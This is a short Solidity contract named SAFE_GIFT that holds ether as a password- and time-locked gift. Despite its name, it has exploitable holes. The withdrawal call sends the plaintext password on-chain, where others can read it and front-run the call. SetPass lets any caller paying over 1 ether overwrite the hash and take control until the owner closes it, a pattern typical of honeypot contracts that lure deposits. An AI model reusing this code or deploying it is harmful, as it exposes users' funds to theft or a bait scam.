1 pragma solidity ^0.4.19;
2 
3 contract SAFE_GIFT
4 {
5     function GetGift(bytes pass)
6     external
7     payable
8     {
9         if(hashPass == keccak256(pass) && now>giftTime)
10         {
11             msg.sender.transfer(this.balance);
12         }
13     }
14     
15     function GetGift()
16     public
17     payable
18     {
19         if(msg.sender==reciver && now>giftTime)
20         {
21             msg.sender.transfer(this.balance);
22         }
23     }
24     
25     bytes32 hashPass;
26     
27     bool closed = false;
28     
29     address sender;
30     
31     address reciver;
32  
33     uint giftTime;
34  
35     function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
36     
37     function SetPass(bytes32 hash)
38     public
39     payable
40     {
41         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
42         {
43             hashPass = hash;
44             sender = msg.sender;
45             giftTime = now;
46         }
47     }
48     
49     function SetGiftTime(uint date)
50     public
51     {
52         if(msg.sender==sender)
53         {
54             giftTime = date;
55         }
56     }
57     
58     function SetReciver(address _reciver)
59     public
60     {
61         if(msg.sender==sender)
62         {
63             reciver = _reciver;
64         }
65     }
66     
67     function PassHasBeenSet(bytes32 hash)
68     public
69     {
70         if(hash==hashPass&&msg.sender==sender)
71         {
72            closed=true;
73         }
74     }
75     
76     function() public payable{}
77     
78 }